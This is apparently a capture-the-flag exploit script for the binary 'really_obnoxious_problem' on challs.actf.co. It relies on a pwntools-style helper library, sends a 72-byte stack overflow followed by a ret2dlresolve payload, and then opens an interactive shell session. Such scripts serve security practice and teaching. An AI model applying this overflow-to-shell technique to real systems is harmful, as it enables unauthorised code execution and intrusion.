#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./really_obnoxious_problem')
host = args.HOST or 'challs.actf.co'
port = int(args.PORT or 31225)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

libc=SetupLibcELF()
io = start()

re()
sl(b"A")
re()
sl(b"A"*72 + Ret2DLResolve())


io.interactive()
